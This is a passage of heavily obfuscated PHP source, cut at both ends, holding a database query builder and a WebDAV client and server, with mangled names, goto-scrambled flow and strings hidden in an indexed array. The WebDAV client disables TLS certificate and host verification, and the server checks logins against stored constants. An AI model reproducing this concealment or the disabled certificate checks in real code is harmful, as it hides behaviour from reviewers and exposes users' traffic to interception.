parse_str($eš¤Œ¯ó´, $eš¤Œ¯ó´); } elseif (!is_array($eš¤Œ¯ó´)) { think_exception(think_lang($fæ‰‰ö‚½[255])); } $this->data = $eš¤Œ¯ó´; return $this; } public function join($bŠ•œ‹Œ„Û) { $bÁ‚„Ùˆ´à =& $_SERVER[Ö]; if (is_array($bŠ•œ‹Œ„Û)) { $this->options[$bÁ‚„Ùˆ´à[266]] = $bŠ•œ‹Œ„Û; } elseif (!empty($bŠ•œ‹Œ„Û)) { $this->options[$bÁ‚„Ùˆ´à[266]][] = $bŠ•œ‹Œ„Û; } return $this; } public function union($F¦‹Ÿ£”œÏ, $BÆÀº‡ø• = false) { goto c½‹¨ôí ³; c½‹¨ôí ³: $e Œ…™‰ã˜ =& $_SERVER[Ö]; if (empty($F¦‹Ÿ£”œÏ)) { return $this; } if ($BÆÀº‡ø•) { $this->options[$e Œ…™‰ã˜[331]][$e Œ…™‰ã˜[332]] = !0; } goto FÂ‚ÜÖØÌ; BàÊ ÑÉ²·: return $this; goto BÔ©Ìùó˜; FÂ‚ÜÖØÌ: if (is_object($F¦‹Ÿ£”œÏ)) { $F¦‹Ÿ£”œÏ = get_object_vars($F¦‹Ÿ£”œÏ); } if (is_string($F¦‹Ÿ£”œÏ)) { $bÂÏÒÑ©«£ = $F¦‹Ÿ£”œÏ; } elseif (is_array($F¦‹Ÿ£”œÏ)) { if (isset($F¦‹Ÿ£”œÏ[0])) { $this->options[$e Œ…™‰ã˜[331]] = array_merge($this->options[$e Œ…™‰ã˜[331]], $F¦‹Ÿ£”œÏ); return $this; } else { $bÂÏÒÑ©«£ = $F¦‹Ÿ£”œÏ; } } else { think_exception(think_lang($e Œ…™‰ã˜[255])); } $this->options[$e Œ…™‰ã˜[331]][] = $bÂÏÒÑ©«£; goto BàÊ ÑÉ²·; BÔ©Ìùó˜: } public function cache($eƒ“­×“ìó = true, $bç²ÈÌğ™Õ = null, $DÁöá¾öšĞ = '') { $CÑâ¾Ïºéì =& $_SERVER[Ö]; if (!1 !== $eƒ“­×“ìó) { $this->options[$CÑâ¾Ïºéì[333]] = array($CÑâ¾Ïºéì[89] => $eƒ“­×“ìó, $CÑâ¾Ïºéì[323] => $bç²ÈÌğ™Õ, $CÑâ¾Ïºéì[29] => $DÁöá¾öšĞ); } return $this; } public function field($d’æŠ­Ö×¸, $F¶ÔæÈã¤ = false) { $DåÆ‡ğˆÊ =& $_SERVER[Ö]; if (!0 === $d’æŠ­Ö×¸) { $BÅóŒ®“ãµ = $this->getDbFields(); $d’æŠ­Ö×¸ = $BÅóŒ®“ãµ ? $BÅóŒ®“ãµ : $DåÆ‡ğˆÊ[172]; } elseif ($F¶ÔæÈã¤) { if (is_string($d’æŠ­Ö×¸)) { $d’æŠ­Ö×¸ = explode($DåÆ‡ğˆÊ[47], $d’æŠ­Ö×¸); } $BÅóŒ®“ãµ = $this->getDbFields(); $d’æŠ­Ö×¸ = $BÅóŒ®“ãµ ? array_diff($BÅóŒ®“ãµ, $d’æŠ­Ö×¸) : $d’æŠ­Ö×¸; } $this->options[$DåÆ‡ğˆÊ[257]] = $d’æŠ­Ö×¸; return $this; } public function scope($C„íÄß‘»ä = '', $B©Õš…öõ³ = NULL) { $aØ±ÇòÔöÌ =& $_SERVER[Ö]; if ($aØ±ÇòÔöÌ[33] === $C„íÄß‘»ä) { if (isset($this->_scope[$aØ±ÇòÔöÌ[34]])) { $a¬„Ûé£Ç· = $this->_scope[$aØ±ÇòÔöÌ[34]]; } else { return $this; } } elseif (is_string($C„íÄß‘»ä)) { $B¬÷¸©²‹¼ = explode($aØ±ÇòÔöÌ[47], $C„íÄß‘»ä); $a¬„Ûé£Ç· = array(); foreach ($B¬÷¸©²‹¼ as $E±µ„ÇÓ£Ş) { if (!isset($this->_scope[$E±µ„ÇÓ£Ş])) { continue; } $a¬„Ûé£Ç· = array_merge($a¬„Ûé£Ç·, $this->_scope[$E±µ„ÇÓ£Ş]); } if (!empty($B©Õš…öõ³) && is_array($B©Õš…öõ³)) { $a¬„Ûé£Ç· = array_merge($a¬„Ûé£Ç·, $B©Õš…öõ³); } } elseif (is_array($C„íÄß‘»ä)) { $a¬„Ûé£Ç· = $C„íÄß‘»ä; } if (is_array($a¬„Ûé£Ç·) && !empty($a¬„Ûé£Ç·)) { $this->options = array_merge($this->options, array_change_key_case($a¬„Ûé£Ç·)); } return $this; } public function where($c„’àË£ß, $d•âù¬Š¼œ = null) { $B‡¨¶ËŒÇ =& $_SERVER[Ö]; if (!is_null($d•âù¬Š¼œ) && is_string($c„’àË£ß)) { if (!is_array($d•âù¬Š¼œ)) { $d•âù¬Š¼œ = func_get_args(); array_shift($d•âù¬Š¼œ); } $d•âù¬Š¼œ = array_map(array($this->db, $B‡¨¶ËŒÇ[327]), $d•âù¬Š¼œ); $c„’àË£ß = vsprintf($c„’àË£ß, $d•âù¬Š¼œ); } elseif (is_object($c„’àË£ß)) { $c„’àË£ß = get_object_vars($c„’àË£ß); } elseif (is_array($c„’àË£ß)) { foreach ($c„’àË£ß as $dùç„¤Ã => $cÆµÃ²°) { if ((is_numeric($dùç„¤Ã) || !$dùç„¤Ã) && is_string($cÆµÃ²°)) { think_trace($B‡¨¶ËŒÇ[334], $B‡¨¶ËŒÇ[33], $B‡¨¶ËŒÇ[46]); die; } } } if (is_string($c„’àË£ß) && $B‡¨¶ËŒÇ[33] != $c„’àË£ß) { $EÓÕ±«¡„ = array(); $EÓÕ±«¡„[$B‡¨¶ËŒÇ[335]] = $c„’àË£ß; $c„’àË£ß = $EÓÕ±«¡„; } if (isset($this->options[$B‡¨¶ËŒÇ[259]])) { $this->options[$B‡¨¶ËŒÇ[259]] = array_merge($this->options[$B‡¨¶ËŒÇ[259]], $c„’àË£ß); } else { $this->options[$B‡¨¶ËŒÇ[259]] = $c„’àË£ß; } return $this; } public function limit($e†²ïÄàê­, $aâ‰ÉæÅ¬ = null) { $eÛ–áöôÍœ =& $_SERVER[Ö]; $this->options[$eÛ–áöôÍœ[276]] = is_null($aâ‰ÉæÅ¬) ? $e†²ïÄàê­ : $e†²ïÄàê­ . $eÛ–áöôÍœ[47] . $aâ‰ÉæÅ¬; return $this; } public function page($C£¨â³É—Ø, $FæšåÅ²âÅ = null) { $Cô¨‚ÜÖÃç =& $_SERVER[Ö]; $this->options[$Cô¨‚ÜÖÃç[336]] = is_null($FæšåÅ²âÅ) ? $C£¨â³É—Ø : $C£¨â³É—Ø . $Cô¨‚ÜÖÃç[47] . $FæšåÅ²âÅ; return $this; } public function comment($bˆ‚Š¼İ´÷) { $this->options[$_SERVER[Ö][337]] = $bˆ‚Š¼İ´÷; return $this; } public function setProperty($D’‡ ›ù©©, $CËæÜ˜Ü) { if (property_exists($this, $D’‡ ›ù©©)) { $this->{$D’‡ ›ù©©} = $CËæÜ˜Ü; } return $this; } } goto f‰ôÁ¨…†ê; fò¨™´¢¢¤: class HttpDavClient { public function __construct($aàó÷ŠÂ¼, $a×¤“æŸ‚†, $dá’½î÷Ê‚) { $this->header = array(); $this->userName = $a×¤“æŸ‚†; $this->userPassowrd = $dá’½î÷Ê‚; } protected function makePath($b¸ğË’Áñ) { return $b¸ğË’Áñ; } protected function setHeader($DéĞÙÅÀ§Ö, $fÙ«ôÓÁŒ = false) { if ($fÙ«ôÓÁŒ === !1) { $this->header[] = $DéĞÙÅÀ§Ö; } else { $this->header[] = $DéĞÙÅÀ§Ö . $_SERVER[Ö][875] . $fÙ«ôÓÁŒ; } } public function move($dùƒíÉóÜˆ, $B¨—ÖÜ…², $cÉÜã–òå² = '') { $dã‰Ö‰‡Ì¬ =& $_SERVER[Ö]; $this->setHeader($dã‰Ö‰‡Ì¬[1742], $this->makePath($B¨—ÖÜ…²)); $this->setHeader($dã‰Ö‰‡Ì¬[1743], $dã‰Ö‰‡Ì¬[1744]); if ($cÉÜã–òå²) { $this->setHeader($dã‰Ö‰‡Ì¬[1745], $dã‰Ö‰‡Ì¬[920] . $cÉÜã–òå² . $dã‰Ö‰‡Ì¬[923]); } return $this->send($dã‰Ö‰‡Ì¬[1746], $dùƒíÉóÜˆ); } public function copy($A¸ÍÀ˜©’, $d˜Ã†º¦òø) { $fˆØßÆÀç„ =& $_SERVER[Ö]; $this->setHeader($fˆØßÆÀç„[1742], $this->makePath($d˜Ã†º¦òø)); $this->setHeader($fˆØßÆÀç„[1743], $fˆØßÆÀç„[1744]); return $this->send($fˆØßÆÀç„[1747], $A¸ÍÀ˜©’); } public function mkcol($c£ìĞ­Ò‹) { $fã¼½ª‹ù =& $_SERVER[Ö]; $this->setHeader($fã¼½ª‹ù[1743], $fã¼½ª‹ù[1744]); return $this->send($fã¼½ª‹ù[1748], $c£ìĞ­Ò‹); } public function delete($eÆô§ŒíÂ, $AòÅƒìØŸ„ = '') { $E„¬§Àé ï =& $_SERVER[Ö]; if ($AòÅƒìØŸ„) { $this->setHeader($E„¬§Àé ï[1745], $E„¬§Àé ï[920] . $AòÅƒìØŸ„ . $E„¬§Àé ï[923]); } return $this->send($E„¬§Àé ï[1236], $eÆô§ŒíÂ); } public function propfind($fòßå–ÁÆ) { $C‘“¼­áí =& $_SERVER[Ö]; $this->setHeader($C‘“¼­áí[1749], $C‘“¼­áí[83]); $this->setHeader($C‘“¼­áí[1750], $C‘“¼­áí[1751]); $D®‡º‹ = $C‘“¼­áí[1752]; return $this->send($C‘“¼­áí[1753], $fòßå–ÁÆ, $D®‡º‹); } public function options($F˜äâà¿Ùğ) { return $this->send($_SERVER[Ö][1754], $F˜äâà¿Ùğ); } public function get($C÷ÖŒš³‰) { return $this->send($_SERVER[Ö][212], $C÷ÖŒš³‰); } public function put($AÅøæ‘¢ƒò, $CåÂ±ôÜÓ², $béÖãî—„¨ = '') { $CÂ†¼Şµ¬ =& $_SERVER[Ö]; if ($béÖãî—„¨) { $this->setHeader($CÂ†¼Şµ¬[1745], $CÂ†¼Şµ¬[920] . $béÖãî—„¨ . $CÂ†¼Şµ¬[923]); } return $this->send($CÂ†¼Şµ¬[210], $AÅøæ‘¢ƒò, $CåÂ±ôÜÓ²); } protected function send($cŠÆÌ¡Õ¼–, $FÖ…ˆ­’Ç, $BßâÂ‡ÔÖö = false, $AØğÊ¼åÔ = false) { goto EåÙê’º©Ú; B•¥óé³À‹: $this->setHeader($B°¡£¾Ö£); if ($BßâÂ‡ÔÖö) { $BßâÂ‡ÔÖö = $BçÆâŠ‹Œ[1756] . $BßâÂ‡ÔÖö; } if (!request_url_safe($FÖ…ˆ­’Ç)) { return !1; } goto Cä›¼ŠàÉ¬; EåÙê’º©Ú: $BçÆâŠ‹Œ =& $_SERVER[Ö]; $B°¡£¾Ö£ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($BçÆâŠ‹Œ[1755], $BçÆâŠ‹Œ[50]); goto B•¥óé³À‹; B­Ñ°­¦áÏ: curl_setopt($D§Ûà´÷õ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($D§Ûà´÷õ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($D§Ûà´÷õ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto AêšŒ…Äè; AêšŒ…Äè: curl_setopt($D§Ûà´÷õ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($D§Ûà´÷õ, CURLOPT_SSL_VERIFYHOST, !1); $cÁ÷ìÈêÔ½ = curl_exec($D§Ûà´÷õ); goto aâ—ÛÎàÃ; aâ—ÛÎàÃ: $this->header = array(); return $cÁ÷ìÈêÔ½; goto föÜæè‘¨; Cä›¼ŠàÉ¬: $D§Ûà´÷õ = curl_init($FÖ…ˆ­’Ç); curl_setopt($D§Ûà´÷õ, CURLOPT_CUSTOMREQUEST, $cŠÆÌ¡Õ¼–); curl_setopt($D§Ûà´÷õ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto B­Ñ°­¦áÏ; föÜæè‘¨: } } class HttpDavServer { public function __construct($b°á—ò«ãõ, $fî‹›½ïµ–) { $this->root = $b°á—ò«ãõ; $this->initPath($fî‹›½ïµ–); $this->start(); } public function initPath($dŒã¼˜†Ã¹) { $AÚ¿´ôËŠ =& $_SERVER[Ö]; $B¿ƒØ‹†Ôç = rtrim($_SERVER[$AÚ¿´ôËŠ[1365]], $AÚ¿´ôËŠ[8]) . $AÚ¿´ôËŠ[8]; $this->urlBase = substr($B¿ƒØ‹†Ôç, 0, strpos($B¿ƒØ‹†Ôç, $dŒã¼˜†Ã¹) + 1); $this->urlBase = rtrim($this->urlBase, $AÚ¿´ôËŠ[8]) . $dŒã¼˜†Ã¹; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $FŒÏˆæÉ±‚ =& $_SERVER[Ö]; $aËÕ·«¡¡— = HttpAuth::get(); if ($aËÕ·«¡¡—[$FŒÏˆæÉ±‚[531]] == $FŒÏˆæÉ±‚[1757] && $aËÕ·«¡¡—[$FŒÏˆæÉ±‚[892]] == $FŒÏˆæÉ±‚[1758]) { return !0; } HttpAuth::error(); } public function start() { goto EÂ×Û‰ø¢°; EÂ×Û‰ø¢°: $f½¦µË˜ =& $_SERVER[Ö]; $this->checkUser(); $A—•ÊÅ = $f½¦µË˜[142] . HttpHeader::method(); goto e³§¿Í¹¤; e³§¿Í¹¤: if (!method_exists($this, $A—•ÊÅ)) { pr($A—•ÊÅ . $f½¦µË˜[1759]); die; } $EæËØ¨¶Õ— = array($f½¦µË˜[1760], $f½¦µË˜[1761]); if (!in_array($A—•ÊÅ, $EæËØ¨¶Õ—) && !$this->pathExists($this->path)) { $fÆªÛí®î = array($f½¦µË˜[1025] => 404); } else { $fÆªÛí®î = $this->{$A—•ÊÅ}(); } goto AË§¬éÉ°; AË§¬éÉ°: if (!$fÆªÛí®î) { return; } self::response($fÆªÛí®î); goto Fî£Œ±øÏš; Fî£Œ±øÏš: } public function pathGet($d¡Ùø¢Ü = false) { $bºß½ÄâÛ =& $_SERVER[Ö]; $E£ÙÑö®ìö = $d¡Ùø¢Ü ? $_SERVER[$bºß½ÄâÛ[1762]] : $_SERVER[$bºß½ÄâÛ[1365]]; $E£ÙÑö®ìö = KodIO::clear(rawurldecode($E£ÙÑö®ìö)); if (!strstr($E£ÙÑö®ìö, KodIO::clear($this->urlBase))) { return !1; } return substr($E£ÙÑö®ìö, strpos($E£ÙÑö®ìö, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($e ºÙîÈ´Â) { return file_exists($e ºÙîÈ´Â); } public function pathMkdir($E‡±ÔÍÄÅ½) { return mkdir($E‡±ÔÍÄÅ½, 511, !0); } public function pathInfo($F¥°½»Ÿ‹) { return path_info($F¥°½»Ÿ‹); } public function pathList($C´®Ø®˜š˜) { return path_list($C´®Ø®˜š˜); } public function pathOut($AÕ™ÓİóÚˆ) { echo file_get_contents($AÕ™ÓİóÚˆ); } public function pathPut($dº¨Ø·éï§, $AÏŒ÷êĞùŒ = '') { if (!$AÏŒ÷êĞùŒ) { return file_put_contents($dº¨Ø·éï§, $_SERVER[Ö][33]); } return move_path($AÏŒ÷êĞùŒ, $dº¨Ø·éï§); } public function pathRemove($fô™æ‘á­Í) { if (is_file($fô™æ‘á­Í)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($e‹„µ®á¢ä, $AÒŸÍ¢ñÓã) { return move_path($e‹„µ®á¢ä, $AÒŸÍ¢ñÓã); } public function pathCopy($bœ£‡‘È²š, $F÷Ëã¥¬“·) { return copy_dir($bœ£‡‘È²š, $F÷Ëã¥¬“·); } public function parsePath($Bç™£ÆŠÎ¼) { return $Bç™£ÆŠÎ¼; } public function parseItem($EÉ¨İ¤¾ÖË, $E°„ˆâÔ¼) { goto e”ñöÄÇÛ; F±­ò¦ºÙŠ: if ($E°„ˆâÔ¼) { $EÅ¤ÏÅÕØ = $AòŞ¥Óè‚ó[8] . str_replace($AòŞ¥Óè‚ó[168], $AòŞ¥Óè‚ó[8], rawurlencode($this->pathGet())); } if (!trim($EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[106]])) { $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[106]] = time(); } if (!trim($EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[183]])) { $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[183]] = time(); } goto a´µñÚ§¢; e”ñöÄÇÛ: $AòŞ¥Óè‚ó =& $_SERVER[Ö]; $EÅ¤ÏÅÕØ = $this->pathGet() . $AòŞ¥Óè‚ó[8] . $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[28]]; $EÅ¤ÏÅÕØ = $AòŞ¥Óè‚ó[8] . str_replace($AòŞ¥Óè‚ó[168], $AòŞ¥Óè‚ó[8], rawurlencode($EÅ¤ÏÅÕØ)); goto F±­ò¦ºÙŠ; a´µñÚ§¢: $EãŠÌÍ‘Ù = array($AòŞ¥Óè‚ó[1763] => KodIO::clear($this->urlBase . $EÅ¤ÏÅÕØ), $AòŞ¥Óè‚ó[106] => @gmdate($AòŞ¥Óè‚ó[1764], $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[106]]), $AòŞ¥Óè‚ó[183] => @gmdate($AòŞ¥Óè‚ó[1765], $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[183]]), $AòŞ¥Óè‚ó[77] => $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[77]] ? $EÉ¨İ¤¾ÖË[$AòŞ¥Óè‚ó[77]] : 0); return $EãŠÌÍ‘Ù; goto a•ê¿«ßÑŸ; a•ê¿«ßÑŸ: } public function parseItemXml($b¶†Åã¿Ë°, $d´ßçÂ–½ï) { $EÀÎ„Ù½æ =& $_SERVER[Ö]; $d‡¸™¼Øöä = $this->parseItem($b¶†Åã¿Ë°, $d´ßçÂ–½ï); if ($b¶†Åã¿Ë°[$EÀÎ„Ù½æ[29]] == $EÀÎ„Ù½æ[76]) { $aÛë×†ŸË = $EÀÎ„Ù½æ[1766]; $aÛë×†ŸË .= $EÀÎ„Ù½æ[1767]; } else { $eµ‡¹¶ÈÉã = $b¶†Åã¿Ë°[$EÀÎ„Ù½æ[156]] ? $b¶†Åã¿Ë°[$EÀÎ„Ù½æ[156]] : get_path_ext($b¶†Åã¿Ë°[$EÀÎ„Ù½æ[28]]); $FÑùÕøÑ = get_file_mime($eµ‡¹¶ÈÉã); $aÛë×†ŸË = $EÀÎ„Ù½æ[1768]; $aÛë×†ŸË .= "\74\104\72\147\x65\x74\x63\x6f\x6e\164\x65\156\164\x74\171\x70\x65\x3e{$FÑùÕøÑ}\x3c\57\104\x3a\147\145\x74\143\x6f\156\164\145\x6e\164\x74\171\x70\x65\76"; } return "\12\x9\x9\74\104\x3a\162\x65\163\160\x6f\156\x73\x65\76\xa\x9\x9\11\74\x44\x3a\x68\162\x65\x66\x3e{$d‡¸™¼Øöä[$EÀÎ„Ù½æ[1763]]}\x3c\x2f\x44\72\x68\162\145\x66\76\12\11\11\11\74\x44\72\x70\x72\157\160\163\x74\141\x74\x3e\xa\11\11\11\11\x3c\104\72\x70\162\157\160\76\12\x9\11\x9\x9\x9\74\x44\72\x67\145\x74\154\x61\x73\x74\155\x6f\x64\x69\x66\x69\145\x64\x3e{$d‡¸™¼Øöä[$EÀÎ„Ù½æ[106]]}\x3c\x2f\x44\x3a\x67\x65\x74\x6c\x61\x73\x74\155\x6f\144\151\146\151\145\x64\76\xa\x9\11\x9\x9\x9\x3c\104\72\x63\x72\x65\141\x74\151\x6f\156\x64\141\x74\145\76{$d‡¸™¼Øöä[$EÀÎ„Ù½æ[183]]}\x3c\57\104\72\x63\162\x65\x61\164\x69\157\156\144\x61\164\145\76\xa\x9\x9\11\11\x9\74\104\x3a\x67\145\164\143\157\x6e\164\x65\156\x74\154\x65\x6e\147\x74\x68\76{$d‡¸™¼Øöä[$EÀÎ„Ù½æ[77]]}\74\57\x44\x3a\x67\145\164\x63\157\x6e\x74\145\x6e\x74\x6c\x65\x6e\147\164\150\76\xa\11\11\x9\11\x9{$aÛë×†ŸË}\xa\x9\11\x9\11\74\x2f\x44\x3a\160\x72\x6f\x70\76\xa\11\11\11\x9\x3c\x44\x3a\163\x74\141\164\165\x73\76\x48\124\x54\120\57\x31\56\61\40\x32\x30\x30\40\x4f\113\x3c\57\104\72\163\x74\x61\164\165\x73\x3e\xa\x9\x9\11\x3c\57\x44\x3a\x70\x72\157\x70\163\164\141\x74\76\12\x9\x9\x3c\57\104\x3a\162\145\163\160\x6f\156\x73\x65\x3e"; } public function pathListMerge($e£ù²ô…‘¤) { goto eË˜—’Èğ÷; c˜éù¿±ãÃ: $C®ïÅ´„âæ = array(); foreach ($e£ù²ô…‘¤ as $BŠò¤»’Å´ => $FœÁæ°´×ù) { if (!in_array($BŠò¤»’Å´, $b‘óóƒÊŒ) || !is_array($FœÁæ°´×ù)) { continue; } $C®ïÅ´„âæ = array_merge($C®ïÅ´„âæ, $FœÁæ°´×ù); } foreach ($C®ïÅ´„âæ as &$e¾¿ÔùÈë·) { $e¾¿ÔùÈë·[$F˜…ƒòÂÎê[28]] = str_replace($F˜…ƒòÂÎê[8], $F˜…ƒòÂÎê[1367], $e¾¿ÔùÈë·[$F˜…ƒòÂÎê[28]]); } goto fï¿´¶ß‡‰; fï¿´¶ß‡‰: return $C®ïÅ´„âæ; goto d÷ƒÈ…Œù; eË˜—’Èğ÷: $F˜…ƒòÂÎê =& $_SERVER[Ö]; if (!$e£ù²ô…‘¤) { return $e£ù²ô…‘¤; } $b‘óóƒÊŒ = array($F˜…ƒòÂÎê[73], $F˜…ƒòÂÎê[74], $F˜…ƒòÂÎê[1769]); goto c˜éù¿±ãÃ; d÷ƒÈ…Œù: } public function httpPROPFIND() { goto cóÏ«ƒ¶ÔÛ; fÔÙÄñ÷¨Í: if ($f´ñÇÃå«Í) { $E–‰óÍ£ŞŸ = array($Aò¥…ŸÖ‘Ò); } else { $Aò¥…ŸÖ‘Ò[$EŠÛéğÎ¨²[28]] = $EŠÛéğÎ¨²[33]; $E–‰óÍ£ŞŸ = array_merge(array($Aò¥…ŸÖ‘Ò), $E–‰óÍ£ŞŸ); } $B»…ÌÚ¦õ‚ = $EŠÛéğÎ¨²[33]; foreach ($E–‰óÍ£ŞŸ as $e£‹Èêí‡Ò) { $B»…ÌÚ¦õ‚ .= $this->parseItemXml($e£‹Èêí‡Ò, $f´ñÇÃå«Í); } goto cœ®¥‡ò‰; cóÏ«ƒ¶ÔÛ: $EŠÛéğÎ¨² =& $_SERVER[Ö]; $bˆÌê¾ˆ„ = $this->pathList($this->path); $E–‰óÍ£ŞŸ = $this->pathListMerge($bˆÌê¾ˆ„); goto F“¦·Æº£˜; F“¦·Æº£˜: $Aò¥…ŸÖ‘Ò = $bˆÌê¾ˆ„[$EŠÛéğÎ¨²[1770]]; if (!is_array($E–‰óÍ£ŞŸ) || $Aò¥…ŸÖ‘Ò[$EŠÛéğÎ¨²[1771]] === !1) { return array($EŠÛéğÎ¨²[1772] => 404, $EŠÛéğÎ¨²[1773] => $EŠÛéğÎ¨²[1774]); } $f´ñÇÃå«Í = $Aò¥…ŸÖ‘Ò[$EŠÛéğÎ¨²[29]] == $EŠÛéğÎ¨²[163] || HttpHeader::get($EŠÛéğÎ¨²[1749]) == $EŠÛéğÎ¨²[464]; goto fÔÙÄñ÷¨Í; cœ®¥‡ò‰: return array($EŠÛéğÎ¨²[1772] => 207, $EŠÛéğÎ¨²[1773] => "\x3c\104\72\x6d\x75\154\x74\151\x73\x74\x61\x74\x75\163\40\170\155\x6c\156\x73\x3a\x44\x3d\x22\x44\101\x56\72\x22\x3e\12{$B»…ÌÚ¦õ‚}\xa\x3c\57\104\72\x6d\165\x6c\164\x69\x73\x74\x61\164\165\x73\x3e"); goto e¤æêøœŠé; e¤æêøœŠé: } public function httpHEAD() { $EÖŞ¤Û˜øÛ =& $_SERVER[Ö]; $f„¸´ßİâ¨ = $this->pathInfo($this->path); if (!$f„¸´ßİâ¨ || $f„¸´ßİâ¨[$EÖŞ¤Û˜øÛ[29]] == $EÖŞ¤Û˜øÛ[76]) { return array($EÖŞ¤Û˜øÛ[1025] => 200, $EÖŞ¤Û˜øÛ[1192] => array($EÖŞ¤Û˜øÛ[1775])); } return array($EÖŞ¤Û˜øÛ[1025] => 200, $EÖŞ¤Û˜øÛ[1192] => array($EÖŞ¤Û˜øÛ[1776], $EÖŞ¤Û˜øÛ[135], $EÖŞ¤Û˜øÛ[1777] . $f„¸´ßİâ¨[$EÖŞ¤Û˜øÛ[77]], $EÖŞ¤Û˜øÛ[1778] . get_file_mime($f„¸´ßİâ¨[$EÖŞ¤Û˜øÛ[156]]), $EÖŞ¤Û˜øÛ[131] . gmdate($EÖŞ¤Û˜øÛ[1764], $f„¸´ßİâ¨[$EÖŞ¤Û˜øÛ[1239]]) . $EÖŞ¤Û˜øÛ[1779], $EÖŞ¤Û˜øÛ[1780])); } public function httpOPTIONS() { $c õ˜ëˆ•° =& $_SERVER[Ö]; return array($c õ˜ëˆ•°[1025] => 200, $c õ˜ëˆ•°[1192] => array($c õ˜ëˆ•°[1781], $c õ˜ëˆ•°[1782], $c õ˜ëˆ•°[1783], $c õ˜ëˆ•°[1248])); } public function httpPROPPATCH() { $fÁ¼ù¬ïÁÀ =& $_SERVER[Ö]; $EÀÄÄÖÃÀé = $fÁ¼ù¬ïÁÀ[1784] . $_SERVER[$fÁ¼ù¬ïÁÀ[1365]] . $fÁ¼ù¬ïÁÀ[1785]; return array($fÁ¼ù¬ïÁÀ[1772] => 207, $fÁ¼ù¬ïÁÀ[1773] => "\74\104\x3a\155\x75\x6c\x74\x69\x73\x74\141\x74\x75\x73\x20\170\155\154\x6e\x73\x3a\104\75\x22\104\101\x56\72\x22\x3e\xa{$EÀÄÄÖÃÀé}\xa\x3c\57\x44\x3a\x6d\x75\x6c\x74\x69\163\164\141\x74\165\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $fïï‚ÉßÒ =& $_SERVER[Ö]; $D­Ö£çà» = $this->uploadFile(); if ($D­Ö£çà») { $Dä î„É¸ = 204; } else { $D­Ö£çà» = $fïï‚ÉßÒ[33]; $Dä î„É¸ = 201; } $BÇÜ—Í‚øƒ = $this->pathPut($this->path, $D­Ö£çà»); if ($BÇÜ—Í‚øƒ == !1) { $Dä î„É¸ = 404; } return array($fïï‚ÉßÒ[1772] => $Dä î„É¸); } private function uploadFile() { goto A¬ëÈäÑÆ•; A¬ëÈäÑÆ•: $f•œºã×¸Í =& $_SERVER[Ö]; @mk_dir(TEMP_FILES); $f¶¾ƒæÊ’ñ = TEMP_FILES . $f•œºã×¸Í[1786] . rand_string(32); goto cÀÉ‘ªÊŞä; aÀ˜»À‘˜Ù: if (@filesize($f¶¾ƒæÊ’ñ) > 0) { return $f¶¾ƒæÊ’ñ; } @unlink($f¶¾ƒæÊ’ñ); return !1; goto bºæÜ—²ÀŞ; cÀÉ‘ªÊŞä: $FóÛÌËõ¿ˆ = @fopen($f¶¾ƒæÊ’ñ, $f•œºã×¸Í[1494]); $CêÚÀöÊÖœ = @fopen($f•œºã×¸Í[1787], $f•œºã×¸Í[1493]); if (!$CêÚÀöÊÖœ || !$FóÛÌËõ¿ˆ) { @unlink($f¶¾ƒæÊ’ñ); return !1; } goto D³­½ò¯¶; D³­½ò¯¶: while (!feof($CêÚÀöÊÖœ)) { fwrite($FóÛÌËõ¿ˆ, fread($CêÚÀöÊÖœ, 1024 * 200)); } fclose($CêÚÀöÊÖœ); fclose($FóÛÌËõ¿ˆ); goto aÀ˜»À‘˜Ù; bºæÜ—²ÀŞ: } public function httpMKCOL() { $cËó‘òÈ ç =& $_SERVER[Ö]; if ($this->pathExists($this->path)) { return array($cËó‘òÈ ç[1025] => 409); } $cÙ•ÃßÛŸ = $this->pathMkdir($this->path); return array($cËó‘òÈ ç[1025] => $cÙ•ÃßÛŸ ? 201 : 403); } public function httpMOVE() { $AÛŒé¢³Ï“ =& $_SERVER[Ö]; $DàŒÁ’¼º¾ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$AÛŒé¢³Ï“[1788]])) { $FØÃ˜ÆÒÇª[$AÛŒé¢³Ï“[1789]] = $_SERVER[$AÛŒé¢³Ï“[1788]] == $AÛŒé¢³Ï“[1790]; } $B¶àªÌÎ = $this->pathMove($this->path, $DàŒÁ’¼º¾); return array($AÛŒé¢³Ï“[1025] => $B¶àªÌÎ ? 201 : 404); } public function httpCOPY() { $Eãƒéà£¦¨ = $this->parsePath($this->pathGet(!0)); $BÓŒÓÒ™‚Ë = $this->pathCopy($this->path, $Eãƒéà£¦¨); return array($_SERVER[Ö][1025] => $BÓŒÓÒ™‚Ë ? 201 : 404); } public function httpDELETE() { $d‹²”Í…— = $this->pathRemove($this->path); return array($_SERVER[Ö][1025] => $d‹²”Í…— ? 200 : 503); } public function httpLOCK() { $Bğ‹ô»éÅÙ =& $_SERVER[Ö]; $C®¥š«ê¡ = md5($this->path); $FŞøˆ„Ş = $Bğ‹ô»éÅÙ[1791] . $this->xmlGet($Bğ‹ô»éÅÙ[1792]) . $Bğ‹ô»éÅÙ[1793] . $C®¥š«ê¡ . $Bğ‹ô»éÅÙ[1794]; return array($Bğ‹ô»éÅÙ[1025] => 200, $Bğ‹ô»éÅÙ[1192] => array($Bğ‹ô»éÅÙ[1795] . $C®¥š«ê¡, $Bğ‹ô»éÅÙ[1796]), $Bğ‹ô»éÅÙ[1797] => $FŞøˆ„Ş); } public function httpUNLOCK() { return array($_SERVER[Ö][1025] => 204); } public function xmlGet($f¢¤ÉÓÕ¤‹) { goto Eô¦¤ÎÒ¾; Eô¦¤ÎÒ¾: $CŠæõ±…Ş =& $_SERVER[Ö]; static 